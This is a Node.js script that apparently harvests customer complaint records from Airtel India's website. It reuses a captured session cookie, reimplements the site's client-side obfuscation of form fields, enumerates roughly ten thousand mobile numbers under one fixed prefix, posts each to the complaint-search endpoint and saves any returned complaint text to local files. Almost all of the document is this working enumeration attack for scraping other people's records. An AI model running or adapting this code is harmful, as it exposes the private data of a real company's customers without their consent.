


		
var cookie = "__utmt_tatvic=1; JSESSIONID=0000X2V0afhGwnzqPvNDH10Eye3:18hisnrv7; mbox=session#1439056500278-460553#1439058923|check#true#1439057123; cust_vid_tatvic=4458461439057062427; s_cc=true; Site_1_Internal=rd7o00000000000000000000ffff0a0e0a56o8080; Site_1_External=rd7o00000000000000000000ffff0a0e0a2fo80; aam_uuid=30305521520535992232680900852263574936; __utma=119537561.1183011914.1439049198.1439049198.1439056502.2; __utmb=119537561.2.10.1439056502; __utmc=119537561; __utmz=119537561.1439049198.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); __utmv=119537561.|5=vid=4458461439057062427=1; s_fid=2692C36D006C8A8F-0E9D3F488E46241A; s_vs=1; s_dln=1; cmgvon=www.google.co.inNatural%20Search; s_psn=%5B%5B%27Natural%2520Search%27%2C%271439057093059%27%5D%5D; s_ppn=Forme%7CHome%7CNeedhelp%7CComplaint%20Search; fgpercent=%5B%5BB%5D%5D; login-attempt=%5B%5BB%5D%5D; s_sq=airtelindev%3D%2526pid%253DForme%25257CHome%25257CNeedhelp%25257CComplaint%252520Search%2526pidt%253D1%2526oid%253Dfunctiononclick%252528event%252529%25257Breturnvalidate%252528%252529%25253B%25257D%2526oidt%253D2%2526ot%253DSUBMIT"
var Base64 = 
{
		// private property
		_keyStr : "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",
	 
		// public method for encoding
		encode : function (input) 
		{
			var output = "";
			var chr1, chr2, chr3, enc1, enc2, enc3, enc4;
			var i = 0;
	 
			input = Base64._utf8_encode(input);
	 
			while (i < input.length) 
			{
				chr1 = input.charCodeAt(i++);
				chr2 = input.charCodeAt(i++);
				chr3 = input.charCodeAt(i++);
	 
				enc1 = chr1 >> 2;
				enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
				enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
				enc4 = chr3 & 63;
	 
				if (isNaN(chr2)) {
					enc3 = enc4 = 64;
				} else if (isNaN(chr3)) {
					enc4 = 64;
				}
				output = output +
				this._keyStr.charAt(enc1) + this._keyStr.charAt(enc2) +
				this._keyStr.charAt(enc3) + this._keyStr.charAt(enc4);
			}
			return output;
		},
	 
		// public method for decoding
		decode : function (input) 
		{
			var output = "";
			var chr1, chr2, chr3;
			var enc1, enc2, enc3, enc4;
			var i = 0;
	 
			input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");
	 
			while (i < input.length) 
			{
				enc1 = this._keyStr.indexOf(input.charAt(i++));
				enc2 = this._keyStr.indexOf(input.charAt(i++));
				enc3 = this._keyStr.indexOf(input.charAt(i++));
				enc4 = this._keyStr.indexOf(input.charAt(i++));
	 
				chr1 = (enc1 << 2) | (enc2 >> 4);
				chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
				chr3 = ((enc3 & 3) << 6) | enc4;
	 
				output = output + String.fromCharCode(chr1);
	 
				if (enc3 != 64) {
					output = output + String.fromCharCode(chr2);
				}
				if (enc4 != 64) {
					output = output + String.fromCharCode(chr3);
				}
			}
			output = Base64._utf8_decode(output);
			return output;
		},
	 
		// private method for UTF-8 encoding
		_utf8_encode : function (string) 
		{
			string = string.replace(/\r\n/g,"\n");
			var utftext = "";
	 
			for (var n = 0; n < string.length; n++) {
	 
				var c = string.charCodeAt(n);
	 
				if (c < 128) {
					utftext += String.fromCharCode(c);
				}
				else if((c > 127) && (c < 2048)) {
					utftext += String.fromCharCode((c >> 6) | 192);
					utftext += String.fromCharCode((c & 63) | 128);
				}
				else {
					utftext += String.fromCharCode((c >> 12) | 224);
					utftext += String.fromCharCode(((c >> 6) & 63) | 128);
					utftext += String.fromCharCode((c & 63) | 128);
				}
			}
			return utftext;
		},
	 
		// private method for UTF-8 decoding
		_utf8_decode : function (utftext) 
		{
			var string = "";
			var i = 0;
			var c = c1 = c2 = 0;
	 
			while ( i < utftext.length ) {
	 
				c = utftext.charCodeAt(i);
	 
				if (c < 128) {
					string += String.fromCharCode(c);
					i++;
				}
				else if((c > 191) && (c < 224)) {
					c2 = utftext.charCodeAt(i+1);
					string += String.fromCharCode(((c & 31) << 6) | (c2 & 63));
					i += 2;
				}
				else {
					c2 = utftext.charCodeAt(i+1);
					c3 = utftext.charCodeAt(i+2);
					string += String.fromCharCode(((c & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));
					i += 3;
				}
			}
			return string;
		},
	
		reverseString : function (theString)
		{
			 var newString = ""; 
			 var counter = theString.length; 

			 for (counter  ;counter > 0 ;counter--) 
			 { 
				 newString += theString.substring(counter-1, counter); 
			 }
			 return newString;
		} ,

		stringManpEncode : function (strValue)
		{
			var strRepVal="";
			var capsAlpha="ABCDEFGHIJKLMNOPQRSTUVWXYZ";
			var repCapsAlpha="ZYXWVUTSRQPONMLKJIHGFEDCBA";
			var smalAlpha="abcdefghijklmnopqrstuvwxyz";	
			var repSmalAlpha="zyxwvutsrqponmlkjihgfedcba";
			var digVal="0123456789=";
			var repDigVal="0@87$!*3^1#"

			for(i=0; i<strValue.length; i++)
			{
				var chVal=strValue.charAt(i);
				
				if(capsAlpha.indexOf(chVal)!=-1)
				{
					var iPos=capsAlpha.indexOf(chVal);
					strRepVal=strRepVal+repSmalAlpha.charAt(iPos);
				}
				else if(smalAlpha.indexOf(chVal)!=-1)
				{
					var iPos=smalAlpha.indexOf(chVal);
					strRepVal=strRepVal+repCapsAlpha.charAt(iPos);
				}
				else if(digVal.indexOf(chVal)!=-1)
				{
					var iPos=digVal.indexOf(chVal);
					strRepVal=strRepVal+repDigVal.charAt(iPos);
				}
				else
				{
					strRepVal=strRepVal+chVal;
				}
			}
			return strRepVal;
		},

		stringManpDecode : function (strValue)
		{	  
			var strRepVal="";
			var capsAlpha="ZYXWVUTSRQPONMLKJIHGFEDCBA";		 
			var smalAlpha="zyxwvutsrqponmlkjihgfedcba";
			var repCapsAlpha="ABCDEFGHIJKLMNOPQRSTUVWXYZ";
			var repSmalAlpha="abcdefghijklmnopqrstuvwxyz";
			var digVal="0@87$!*3^1#";
			var repDigVal="0123456789="

			var strRepVal="";
			for(i=0; i<strValue.length; i++)
			{
				var chVal=strValue.charAt(i);
				
				if(capsAlpha.indexOf(chVal)!=-1)
				{
					var iPos=capsAlpha.indexOf(chVal);
					strRepVal=strRepVal+repSmalAlpha.charAt(iPos);
				}
				else if(smalAlpha.indexOf(chVal)!=-1)
				{
					var iPos=smalAlpha.indexOf(chVal);
					strRepVal=strRepVal+repCapsAlpha.charAt(iPos);
				}
				else if(digVal.indexOf(chVal)!=-1)
				{
					var iPos=digVal.indexOf(chVal);
					strRepVal=strRepVal+repDigVal.charAt(iPos);
				}
				else
				{
					strRepVal=strRepVal+chVal;
				}
			}
			return strRepVal;
		},

		finalManEncodeValue : function (strEncodeVal)
		{
			var x=strEncodeVal.length;
			var z=x%2;
			var s=(x-z)/2;
			var strPartOneVal=strEncodeVal.substring(0, s);
			var strPartTwoVal=strEncodeVal.substring(s, x);

			var revEncValOne=Base64.reverseString(strPartOneVal);	
			var revEncValTwo=Base64.reverseString(strPartTwoVal);

			var encOne=Base64.stringManpEncode(revEncValOne);
			var encTwo=Base64.stringManpEncode(revEncValTwo);
			return 	encOne+encTwo;
		},

		finalManDecodeValue : function (strEncodeVal)
		{
			var x=strEncodeVal.length;
			var z=x%2;
			var s=(x-z)/2;
			var strPartOneVal=strEncodeVal.substring(0, s);
			var strPartTwoVal=strEncodeVal.substring(s, x);
			
			var revEncValOne=Base64.reverseString(strPartOneVal);
			var revEncValTwo=Base64.reverseString(strPartTwoVal);

			var encOne=Base64.stringManpDecode(revEncValOne);
			var encTwo=Base64.stringManpDecode(revEncValTwo);

			return 	encOne+encTwo;
		} ,

		//Method which is called for encoding 
		tripleEncoding : function (orgValue)
		{
			var fstEncVal=Base64.encode(orgValue);
			var secEncVal=Base64.finalManEncodeValue(fstEncVal);
			var fnlEncVal=Base64.encode(secEncVal);
			return fnlEncVal;
		},

		//Method which is called for decoding
		tripleDecoding : function (encValue)
		{
			var fstDecVal=Base64.decode(encValue);
			var secDecVal=Base64.finalManDecodeValue(fstDecVal);
			var fnlDecVal=Base64.decode(secDecVal);
			return fnlDecVal;
		}
}

// Set up the request

var querystring = require('querystring');
var request = require('request');
var fs = require('fs');

var form = {
    username: 'usr',
    password: 'pwd',
    opaque: 'opaque',
    logintype: '1'
};

var numbers = [];
var baseval = '0172460';
var start = 10000;

for(i=335;i<=9999;i++)
{
	//console.log((start + i).toString());
	//console.log((start + i).toString().slice(1,4));
	var num = baseval + (start + i).toString().substring(1,5);
	//console.log(num);
	numbers.push(num);
	//return;
}

var i = 0;

function postData(i)
{
var serviceTypeVal ='3';
var referenceNumberVal = '0';
var mobileNumberVal = numbers[i];


console.log(mobileNumberVal);
// return;
var h_serviceTypeVal = Base64.tripleEncoding(serviceTypeVal);
var h_referenceNumberVal=Base64.tripleEncoding(referenceNumberVal);
var h_mobileNumberVal = Base64.tripleEncoding(mobileNumberVal);

var formData = 'serviceType='+serviceTypeVal+'&referenceNumber='+referenceNumberVal+'&mobileNumber='+mobileNumberVal+'&h_serviceType='+h_serviceTypeVal+'&h_referenceNumber='+h_referenceNumberVal+'&h_mobileNumber='+h_mobileNumberVal;
var contentLength = formData.length;

request({
    headers: {
      'Content-Length': contentLength,
      'Content-Type': 'application/x-www-form-urlencoded',
	'Cookie' : cookie
    },
    uri: 'http://www.airtel.in/forme/home/needhelp/complaint-search',
    body: formData,
    method: 'POST'
  }, function (err, res, body) {
	
	var cheerio = require('cheerio'),
    $ = cheerio.load(body);
   
    body = $('#request1',body).text();
	if(body != '')
	{
   fs.writeFile("/temp/test"+mobileNumberVal, body, function(err) {
    if(err) {
        return console.log(err);
    }
   
    console.log("The file was saved!");
	});
	}
	i++;
	if(i< numbers.length)
	{
	postData(i);
	}
  });
}

postData(i);